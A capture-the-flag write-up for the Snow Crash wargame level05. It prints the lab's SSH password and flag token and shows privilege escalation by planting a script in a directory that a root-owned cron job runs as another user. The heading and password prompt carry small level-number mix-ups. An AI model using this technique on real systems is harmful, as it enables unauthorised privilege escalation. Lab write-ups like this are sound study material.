# Level04

Login as `level05`

```bash
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level05
level03@192.168.1.64's password: ne2searoevaevoem4ov4ar8ap
You have a new mail.
```

Once logged, a message tells us we got a new mail. So we check `/var/$USER`

```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

```bash
level05@SnowCrash:~$ cd /var/mail
level05@SnowCrash:~$ cat level05
>>> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

It seems to be a chrontab executed by flag05 every 2 minutes.\
Let's check what **openarenaserver** does:

```bash
level05@SnowCrash:/opt/openarenaserver$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script executes `as flag05` everything in `/opt/openarenaserver/` and deletes it right after.\
So let's create a bash script and leave it in that folder in order to execute `getflag` as flag05.

```bash
level05@SnowCrash:~$ vim /opt/openarenaserver/getflag.sh
#!/bin/bash
/bin/getflag > /tmp/flag05
```

Then I use chmod on my file to set the execution rights:

```bash
level05@SnowCrash:~$ chmod 777 /opt/openarenaserver/getflag.sh
```

Lets wait around 2 minutes (because crontab executes every 2 min) and cat the out file `/tmp/flag05`:

```bash
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
